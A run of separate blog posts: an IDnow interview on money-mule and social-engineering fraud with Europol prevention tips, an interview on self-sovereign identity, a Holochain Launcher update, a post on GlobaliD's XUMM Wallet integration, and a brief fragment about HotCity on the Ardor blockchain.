<p>Philomena: We recently detected a ‘Money Mule’ pattern originating from the Philippines. At first glance, it looked like an organised criminal activity where users were intentionally cooperating with the fraudsters. By coincidence, we had this rare opportunity to correspond with some people taking part in the scam. After analysing the situation and with the cooperation of the individuals involved, we concluded with high confidence that the users were, in fact, victims of a ‘social engineering’ attack.</p>
<p>Each of the victims was forced to take a loan and got tricked by a shady credit advertisement posted on Facebook. These users were entirely unaware that their actions may bring any penalties to them. We have learned that each case can have a “hidden agenda” that is usually not visible to fraud analysts.</p>
 What are the motives of those involved? 
<p>Michał: Again, we have to distinguish. With what we identify as ‘Money Mules’, we assume a criminal background and an eagerness to make easy money.</p>
<p>Poverty plays a huge role as well, as it can lead to criminal activities. If individuals are desperate or hopeless, they may feel they have no other choice.</p>
 How are ‘Money Mules’ recruited? 
<p>Philomena: Quite often, ‘Money Mules’ are recruited through social media channels. Even if these posts are discovered and taken down by regulatory authorities, it is easy for criminals to re-post scam advertisements. We regularly reach out to hosts (website providers) and make them aware of who is using their services.</p>
<p>Michał: We also see a combination of data leaks and fraudsters. Victims are contacted by a scammer via WhatsApp and get trapped in a social engineering scenario. The approached person might not actively look for any source of income/cooperation but when they receive a random message from an unknown person, somehow it opens an unexpected opportunity to them.</p>
<p>Philomena: From our experience we can, unfortunately, say that&nbsp;it is typically shady trading and investment companies that are constantly looking for victims who would like to taste a “businessman” life.</p>
 What are the consequences for ‘Money Mules’ who have been identified? 
<p>Philomena: Firstly, often all their bank accounts (both accounts with fraudulent and non-fraudulent purposes) get closed or the money is frozen. After getting caught doing these criminal activities, individuals also find it difficult to get credit for things like phone contracts, student loans, and applying for credit in the future. Furthermore, it is also not uncommon to be condemned – individuals can be imprisoned for up to 14 years.</p>
<p>Such activity leaves a mark on the person’s criminal record which brings other consequences – it may also make it challenging to find a job, especially if it is one involving data protection. It is important to highlight this, especially as nowadays, almost every position has something to do with data protection, for example, payments.</p>
 Now that we discussed the subject of ‘Money Mules’, let’s drill further into the phenomenon of ‘Social Engineering’. You already mentioned it, but could you repeat to us, how is this different to ‘Money Mules’? 
<p>Michał: Internally we differentiate them as follows, nevertheless most institutions do not separate between ‘Money Mules’ and ‘Social Engineering’.</p>
<p>Victims of social engineering are not aware that their actions may have legal consequences. The scammer uses psychological manipulation to lure an innocent person into the trap. Usually, they are strongly convinced that they are working as an app tester or a financial clerk.</p>
<p>Furthermore, the tasks given to the victims are designed and described in a way not to draw victims attention. The criminal often provides a fancy job contract, which looks like the actual work arrangement at first glance. Other examples involve applying for a loan. The users are then convinced that the credit can be only issued under specific conditions, which usually contains opening an account with a financial institution and later passing the credentials to the fraudsters.</p>
<p>As a result, the criminal gains access to the freshly created bank account, which may result in further financial malversations in the victim’s name. The scammer will therefore remain undetected, and the whole liability will be passed to the unaware person.</p>
<p>In the case of ‘Money Mules’, the person is willingly cooperating with the criminal. In most scenarios, they are involved in money laundry processes as well and can gain credits for fulfilling different tasks.</p>
 How do victims get involved with ‘Social Engineering’? 
<p>Philomena: Usually, victims fall easily for fake jobs and loan advertisements on social media. In addition, most persons involved in ‘Social Engineering” are very eager to invest their money and are okay with working with a trading company which doesn’t’ necessarily have a good reputation. This is another version of the “boiler room”: The victim receives an “excellent investment offer” that they cannot reject.</p>
<p>Michał: More recently, we came across the so-called ‘Corona Fraud”. Users received a message stating that due to the corona regulation, they are required to register their profile on the specific portal. Naturally, the person then follows these instructions and provides all sensitive data and most likely identify himself/herself for a financial service.</p>
<p>The ‘Corona Fraud’ also occurs on Dating apps when a newly contacted person out of the sudden needs financial help. Also, there is what we call the ‘Inheritance Fraud’. To receive a very attractive sum of money, the victim must open a bank account and perform few money transfers or even provide the scammer with the credentials.</p>
 What are the consequences for the victims? 
<p>Philomena:&nbsp;&nbsp;Fraudsters usually take over the victims’ account and sell the details online, rather on the dark web. Furthermore, usually at this point the victim appears as an easily accessible person (since their data was misused) and attracts other fraudsters. In the following, the victim’s documents/identity are often used for further manipulation and money laundry.</p>
<p>Michał:&nbsp;As for the legal side, there are no legal penalties for being a victim of social engineering. However, the person involved in the fraud might be prevented from leaving their country until the case has been solved. There is also the risk of the person getting a criminal record if the case is not handled correctly and the victim may have to take full liability for the financial losses. It can be a highly time-consuming process to accomplish all the bureaucracy formalities before being actually “free.” Ultimately, the victim might also end with a huge debt and bad credit with credit card institutions.</p>
 Final question: What is – so to speak – the breeding ground for criminal activities such as ‘Money Mules’ or ‘Social Engineering’? What can users on the internet, but also companies, do to put a stop to this? 
<p>Michał:&nbsp;The fundamental problem is that the fraudsters often exploit the victims’ human vulnerabilities. This involves, for example, the financial hardship or interpersonal relationships (for example love relationships) of the victims. The fraudsters often know very well what their victims desire and act accordingly. The scammers work with the victims’ fears and weaknesses.</p>
<p>In situations of need, many people are often more susceptible, so the scammers have an easy target. Also, fake websites, for example, are becoming better and harder for an untrained eye to spot.</p>
<p>Philomena:&nbsp;&nbsp;At this point, I would also like to refer you to the information provided by <a href="https://www.europol.europa.eu/activities-services/public-awareness-and-prevention-guides/money-muling">Europol</a>, which summarizes very effective preventive measures. To put it in my own words, Europol recommends the following actions to users on the Internet:</p>
 
 Never give your bank account or any other personal details to anyone unless you know and trust them. 
 Secure your bank cards. Do not disclose your online banking login details, PIN, CVV number, etc. 
 Be very cautious of unsolicited emails or offers made over social media or in person, promising easy money. 
 Ignore any job offer involving money transfers through your bank account, regardless of how authentic they may seem. If an opportunity sounds too good to be true, it probably is. 
 If you have received emails of this type, do not respond to them, and do not click on any links they contain. Inform the police instead. 
 Stay alert for job ads and social media posts that promise easy money. Always report the account to the platform provider in order to be taken down and prevent other people from falling for the scam. 
 If you happen to receive an offer in person, decline it and report it to the police. 
 If you suspect that you are caught up in a ‘Money Mule’ or money laundering scheme, stop transferring money immediately, notify your bank or payment provider, and report it to your national police. You could help prevent other people from becoming money mules and even help catch the criminals. 
 
<p>Michał: I’d like to stress the fact that IDnow takes criminal activity / fraud very seriously and this is the reason why we have a dedicated team who is constantly working to prevent these types of frauds. As a trusted partner with very strong security standards, IDnow is constantly working to prevent fraudsters to enter our business customers systems, and of course for IDnow it is also very important to help individuals from being scammed, so our work is ultimately also protecting our end users from it.</p>
<p>Many thanks Philomena and Michał for the insights.</p>

<p>The recent EU announcement about having a <a href="https://academy.affinidi.com/5-reasons-to-use-an-identity-wallet-c289ba2980cf">digital wallet</a> for all its citizens has given fresh impetus to the world of decentralization and <a href="https://academy.affinidi.com/self-sovereign-identity-what-you-can-cant-do-with-ssi-1284f7227b4e">Self-Sovereign Identity</a>&nbsp;(SSI).</p><p>In this context, we caught up with <a href="https://www.linkedin.com/in/adrian-doerk/?originalSubdomain=de">Adrian Doerk</a> (popularly known as the <a href="https://ssi-ambassador.medium.com/">SSI Ambassador</a>), the Product Manager and Marketing Lead of Lissi, and the Communication and Public Relations Head at IDunion. This multifaceted personality who owns many hats, talks about the future of SSI, with a focus on the&nbsp;EU.</p><p>Here are some excerpts from this interview.</p> Is SSI going to be big in the coming years? If yes,&nbsp;why? <p>There is a big need for solutions to enable trusted interactions, especially when it comes to identification and authentication. It all stems from the fact that the <a href="https://academy.affinidi.com/web-2-0-vs-web-3-0-a-bridge-between-the-past-and-the-future-c99668c1e2f0">Internet</a> was never designed for identities of individuals in the first place. Though we have standards and protocols for transactions, these are not constructed to enable the average user control of his or her digital identity without depending on a single third&nbsp;party.</p><p>Even with the existing standards and technologies, there are limits. This is most evident from the countless cyberattacks that happen so&nbsp;often.</p><p>Hence, there is a need for trusted interactions. In particular institutions, the government, and public stakeholders believe these trusted interactions are crucial for a functioning society.</p><p>At the heart of it all is an innate need to safely identify and authenticate oneself in the online world. As of now, this need has not been&nbsp;met.</p><p>SSI can fulfill these requirements as it supports the safe and trusted issuance and presentation of credentials among different entities, and this is why <a href="https://academy.affinidi.com/impact-of-self-sovereign-identity-in-real-estate-11456c4b1faa">SSI</a> can be big in the coming&nbsp;years.</p> Are we ready as a society to embrace SSI, in terms of the necessary technologies and infrastructure? <p>Yes and&nbsp;no!</p><p>We’re ready in terms of baseline infrastructure, but when it comes to the nitty-gritty non-technical details such as liabilities and governance, we still have a long way to&nbsp;go.</p><p>As far as the technical infrastructure goes, yes we are right on track to move forward. Though there are some technical aspects that we need to address for <a href="https://academy.affinidi.com/faqs-on-verifiable-credentials-and-self-sovereign-identity-3c3a505878bc">SSI</a> to become more widespread.</p> Europe is one of the frontrunners in the SSI space, especially after the digital wallet announcement. How will it impact life in&nbsp;Europe? <p>It will take some time for this regulation to come into effect and we will know more about the specifications for the identity wallet in the next few months or so. Undoubtedly, it is ambitious and can have a far-reaching impact.</p> What will be the accelerator(s) for&nbsp;SSI? <p>It needs to be a combination of government legislation, ecosystem, and startups in the SSI space. All these stakeholders are key for the acceleration of the ecosystem.</p><p>You obviously need the government’s support as nothing moves without it. Community is also very important for sharing <a href="https://academy.affinidi.com/solving-the-principal-agent-problem-proxy-issuance-with-verifiable-credentials-c8f97ee9ee9b">problems</a> and <a href="https://academy.affinidi.com/25-real-world-use-cases-of-verifiable-credentials-4657c9cbc5e">use-cases</a> and eventually, using them to create an ecosystem.</p><p>So, all the stakeholders must come together to serve the community backed by the government’s support in terms of funding and legislation.</p> If you have to pick one accelerator, what would be right at the top of your&nbsp;list? <p>The ecosystem.</p> What, according to you, is the best way to store and manage verifiable credentials? <p>Storing verifiable credentials on the <a href="https://academy.affinidi.com/do-you-need-blockchain-for-enabling-ssi-452d62b34890">blockchain</a> is a terrible idea, so I hope nobody even thinks of&nbsp;it!</p><p>A <a href="https://academy.affinidi.com/5-reasons-to-use-an-identity-wallet-c289ba2980cf">wallet</a> provides a user interface and helps users to manage keys and use them for interacting with other parties. Currently, wallets work well on mobile devices, which means data is stored locally on smartphones.</p><p>But at some point, we need to move to desktop devices and browsers, and this would necessitate developers and companies to start thinking about where the data should be stored. Again, this would be a wallet-specific implementation that would depend to a large extent on the use-case and the expectations and actions of&nbsp;users.</p><p>For example, a tech-savvy user might want to decide whether he/she wants to store the data on the mobile device or on any other device owned by the user. However, it can also be stored in encrypted storage on the&nbsp;cloud.</p><p>On the other hand, some users might not care so much about where it is stored as long as they can share it in a safe and secure way. Such users may opt for a wallet service, which is fine too because not everyone is tech-savvy enough to choose their place of storage and ensure a high availability of a local&nbsp;backup.</p><p>In all, we need different solutions for different people to store and manage <a href="https://academy.affinidi.com/what-are-verifiable-credentials-79f1846a7b9">verifiable credentials</a>.</p> As a startup in Europe, what are some things that you’d do in the next two&nbsp;years? <p>It depends on the product and the current state of the company. I would help companies and partners to understand what we are building, so they can offer it to their end customers in such a way that it benefits them greatly. At the same time, every stakeholder must understand what the technology is about and why they should use&nbsp;it.</p><p>This is easier said than done because <a href="https://academy.affinidi.com/compare-and-contrast-federated-identity-vs-self-sovereign-identity-227a85cbab18">SSI</a> is a complex technology. So, my focus would be on helping companies to create SSI-based solutions and do everything they can to disseminate information about this technology in a way that everyone can understand.</p> This leads to the next question — What would you do to Create Awareness on&nbsp;SSI? <p>A good way is to use content to explain complex technologies with concepts people are familiar with. In particular, this approach can help people who are new to this industry to get a hang of SSI and the principles and components that drive&nbsp;it.</p> With all these coming together, what changes do you anticipate in the next 3–5&nbsp;years? <p>To be honest, not a whole lot. I don’t foresee a huge societal shift and definitely nothing as impactful as say, the introduction of smartphones.</p><p>What will change is that there will be a greater need to control identities and manage them, and this should make it easy for organizations to offer the concept of SSI to the general&nbsp;public.</p><p>With a growing availability of use cases from different verticals we will see an increased usage of it in the daily life of average people. However, while the public might like the new way of interacting with third parties on the internet a lot of people probably rather say: “That was long overdue” instead of “This will change everything”.</p><p>We signed off on this&nbsp;note!</p><p>We hope that was an interesting read for you and follow us on <a href="https://www.linkedin.com/company/affinidi/">LinkedIn</a>, <a href="https://www.facebook.com/affinidi.devs">Facebook</a>, or <a href="https://twitter.com/affinidi">Twitter</a> for many such interesting insights.

<p>This week brings two big updates:</p>  One for everyone — the Holochain Launcher  One for developers — a scheduler in Holochain v0.0.108   Holochain Launcher preview: user-friendly hApps <p>I hinted at the <a href="https://github.com/holochain/launcher">Holochain Launcher</a> in the <a href="https://blog.holochain.org/holochain-v0-0-107-a-release-to-build-on/#holochain-v0-0-107-changelog">last</a> <a href="https://blog.holochain.org/dev-camp-8-starts-in-two-weeks/#dev-camp-8-huge-turnout-exciting-curriculum">two</a> Dev Pulses, but didn’t go deep into it. So what is it?</p><p>Simply: the Launcher finally makes it easy for non-developers to install and use hApps. On their own devices. Without a computer science degree. Now, all you need to do is <a href="https://github.com/holochain/launcher/releases">download an installer</a> for your OS (Windows, macOS, and Linux are all supported), and it’ll install the Holochain conductor and a basic but user-friendly admin UI. Once you’ve got the Launcher installed, running a new hApp should be as simple as downloading a package and installing it in the Launcher.</p><p>This means that, as a developer, there’s a way to get your hApps into your users’ hands without much fuss. That’s pretty big news! It’s still very new, not yet production-ready, so the devs are asking for feedback — you can report an issue on <a href="https://github.com/holochain/launcher/issues">GitHub</a> or directly from the Launcher’s menu.</p><p>The Dev Camp participants are beginning to battle-test the Launcher, which has already resulted in a few bug fixes and improvements.</p><p>For an alternative approach, I’ve shared before that the folks at Sprillow have created tools that let you embed Holochain into a <a href="https://github.com/Sprillow/embedded-holochain-runner">Rust</a> or <a href="https://github.com/Sprillow/electron-holochain">Electron</a> application. These tools are being used in the desktop version of their <a href="https://github.com/h-be/acorn">Acorn goal-planning app</a>.</p> Try a peer-to-peer application now!   Find a few friends to test the app with.  <a href="https://github.com/holochain/launcher/releases">Download the Launcher</a>.  Install the Launcher.  Download a web hApp, either <a href="https://github.com/eyss/elemental-chess/releases/tag/v0.1.1">Elemental Chess</a> or <a href="https://github.com/holochain/elemental-chat-ui/releases/tag/v0.0.1-alpha37">Elemental Chat</a> (look for the <code>.webhapp</code> file in the downloads section).  Open the launcher and look for the big blue ‘Install new app’ button.  Select the web hApp you just downloaded.  A dialog will pop up. Leave the app ID field unchanged, leave the membrane proof field blank, and choose a word or a string of random characters for the UID field. You and your friends should all enter the same UID — this ‘<a href="https://developer.holochain.org/concepts/2_application_architecture/#dna">clones</a>’ the hApp’s DNAs, giving your group its own private DHT.  After clicking the ‘Install app’ button, you should see your new hApp listed in the main admin window. Click the ‘Open’ button and the hApp’s UI will open in your web browser!   Make your hApp compatible with the Launcher <p>If you’re a hApp developer, it’s pretty simple to build a Launcher-ready hApp. It consists of a hApp (a collection of DNA files) and an archive of static web assets that you bundle together with the <code>hc</code> dev tool. The Launcher has an internal web server listening on localhost that serves those static web assets to your user’s browser. Read the <a href="https://github.com/holochain/launcher#packaging-a-web-happ">readme</a> for full instructions.</p> Holochain v0.0.108 introduces a scheduler <p>Sometimes a hApp will want to do something in the background without user interaction. You can always do this behind the scenes in your UI’s code, but what if the UI is closed and this background task is important to how the hApp works?</p><p>The most recent Holochain release brings a host function called <a href="https://docs.rs/hdk/0.0.108/hdk/time/fn.schedule.html"><code>schedule</code></a>. I’ve written a page on the community wiki that <a href="https://github.com/holochain-open-dev/wiki/wiki/How-to-use-the-scheduler-in-your-zome">explains how it works</a>; check it out if you need something like this in your hApp.</p> Holochain In Action: Introducing the Launcher <p>This week’s Holochain In Action session gives a demo of the Holochain Launcher with two hApps: Elemental Chat and Elemental Chess. It also gets into Holochain networking, particularly what the bootstrap and proxy services are for, and finishes with some of the technologies the Launcher was built with.</p><p>Cover photo by <a href="https://unsplash.com/@spacex?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">SpaceX</a> on <a href="https://unsplash.com/s/photos/rocket-launch?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></p>

   Back in June, XRPL Labs integrated its XUMM Wallet with GlobaliD’s self-sovereign identity platform as part of an ongoing initiative to improve XRP Ledger account trustworthiness.  With GlobaliD, XUMM wallet users are able to link their GlobaliD public profile and have their government IDs attested in order to verify their XRPL accounts.

<p>Back in June, XRPL Labs<a href="https://twitter.com/XRPLLabs/status/1410301187765723139"> integrated its XUMM Wallet with GlobaliD’s self-sovereign identity platform</a> as part of an ongoing initiative to improve XRP Ledger account trustworthiness.</p><p>With GlobaliD, XUMM wallet users are able to link their GlobaliD public profile and have their government IDs attested in order to verify their XRPL accounts. GlobaliD users can now also acquire attestations for their XRPL accounts.</p><p>It’s a pretty big deal. <a href="https://xrpl-labs.com/">XRPL Labs</a> is a startup based in the Netherlands and Estonia focused on developing software for the XRP Ledger that counts <a href="https://ripple.com/">Ripple</a> as an investor. Their <a href="https://xumm.app/">XUMM Wallet</a> offering is the leading noncustodial wallet for accessing the XRP ecosystem with over 200,000 active users and a vibrant developer ecosystem.</p>  <a href="https://twitter.com/XRPLLabs/status/1410301192702410757">How to verify your XUMM Wallet with&nbsp;GlobaliD</a>  <p>A noncustodial wallet is a type of crypto wallet where users have personal custody of their assets. Think of it as having cash in your wallet. The money is yours and you have total control over it when it comes to receiving cash or making payments.</p><p>Contrast that to a custodial wallet that you might have with a service such as Coinbase or Uphold. This is more analogous to a bank account, where the service provider has custody over your assets. You can still receive and make payments as you’d like, but now you’re relying on a central operator to hold onto and make available your assets when necessary.</p><p>These platforms are convenient for users as they can rely on the trust and security of the service provider. Companies like Coinbase and Uphold have stringent KYC/AML (Know Your Customer and Anti-Money Laundering) processes to comply with relevant regulations and to ensure safety for their&nbsp;users.</p><p>With a noncustodial wallet, the onus of trust and security falls on the user. As we like to say at GlobaliD, your sovereign digital identity is a right — but it’s also a responsibility.</p><p>It’s also why GlobaliD’s partnership with XRPL Labs makes so much sense. By integrating GlobaliD, XUMM Wallet users are able to link their digital identity to their wallet, enhancing trust across the ecosystem. By verifying their digital identities, users can know whether or not they’re dealing with the right&nbsp;person.</p><p>That choice, of course, is also up to each individual user as this is an entirely opt-in feature. Users who have completed their ID attestation receive a blue checkmark next to their name, signaling to others that they’ve completed the process. Aside from their name, profile photo, and checkmark, no other information is made&nbsp;public.</p><p>Users who wish to maintain full privacy while still enhancing trust are able to have their ID attested without sharing their name or photo and still get ablue checkmark.</p><p>Whenever it comes to trust, there are always trade offs with privacy and anonymity. With GlobaliD’s self-sovereign framework, you essentially get the best of both worlds. You maintain ownership and control over your identity and your data. And only you decide what you’d like to share. Neither GlobaliD nor XRPL Labs has access to your personal information.</p><p>Thus far, 1463 users have acquired blue checkmarks by linking their GlobaliD identity to their XUMM Wallet, and according to XRPL Labs founder Wietse Wind, the feedback has been resoundingly positive:</p><blockquote>“On the XRP Ledger, accounts (non-custodial wallets) are much like an online identity. While they can be anonymous, many use cases, businesses and other users benefit when users can demonstrate that their blockchain accounts (accounts on the XRP Ledger) can be&nbsp;trusted.</blockquote><blockquote>We’re seeing a clear shift in the XRP Ledger ecosystem among end users — a preference for a more personal user experience, increased trust when sending tokens, and vigilance when it comes to accepting issued tokens versus a completely anonymous situation.</blockquote><blockquote>An integration between GlobaliD and XUMM has been requested and suggested by end users in the past. Now, the integration is live — and with compliance and privacy becoming increasingly important topics for the entire ecosystem, we invite all XUMM users to get their “blue checkmark” for their XRP Ledger account by leveraging the GlobaliD + XUMM integration.”</blockquote><p>More than trust, it’s also about fun. (Or rather, maybe we tend to have more fun when we can trust each other.) One new feature is a public Tip Bot. By integrating GlobaliD, users are able to know who they’re tipping as well as to see who’s tipping them if everyone is opted&nbsp;in.</p><p>All of this, however, is just the beginning. Stay tuned for more exciting updates from GlobaliD x XRPL&nbsp;Labs!</p><p>Want to learn more?

<p>CoinPost: HotCity is one of the Ardor blockchain use cases in which a gamification-based reward model has been implemented and tested to address environmental issues and achieve sustainability. The aim is to crowdsource data of industrial and commercial waste heat in urban planning as potential renewable energy sources. In order for citizens to participate voluntarily and enjoyably, digital points, issued as tokens on the Ignis child chain, are distributed as rewards for providing that information, that can be redeem as vouchers for goods and services by partner companies.</p>
